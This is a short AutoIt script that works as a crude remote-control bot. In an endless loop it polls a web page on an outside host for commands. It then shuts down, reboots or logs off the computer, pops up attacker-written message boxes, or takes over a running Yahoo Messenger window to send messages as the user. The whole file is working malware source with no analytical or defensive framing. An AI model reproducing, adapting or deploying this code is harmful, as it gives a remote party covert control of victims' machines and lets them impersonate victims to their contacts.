#include <INet.au3>
$recent=""
while 1
$a=_INetGetSource("http://shatghai.freevnn.com/")
$b = StringLeft($a,StringLen($a)-977)
$c = StringRight($b,stringlen($b)-149)
if $c = "Shutdown" then
	Shutdown(1)
Elseif $c = "reboot" then
    Shutdown(2)
Elseif $c = "logoff" then
    Shutdown(0)
Elseif StringLeft($c,6) = "msgbox" then
	if $recent <> $c then
        $msgbox=StringSplit($c,"|")
		MsgBox($msgbox[2],$msgbox[3],$msgbox[4])
	EndIf
	$recent = $c
ElseIf StringLeft($c,6) = "sendym" Then
	if $recent <> $c then
		if ProcessExists("YahooMessenger.exe") or ProcessExists("YAHOOM~.EXE") Then
			$sendym=StringSplit($c,"|")
			WinActivate("Yahoo! Messenger","")
			ControlClick("Yahoo! Messenger","",102)
			Send($sendym[2]&"{ENTER}")
			Sleep(200)
			Send($sendym[3]&"{ENTER}")
		EndIf
	EndIf
	$recent = $c
Elseif $c = "exit" then
    Exit
EndIf
WEnd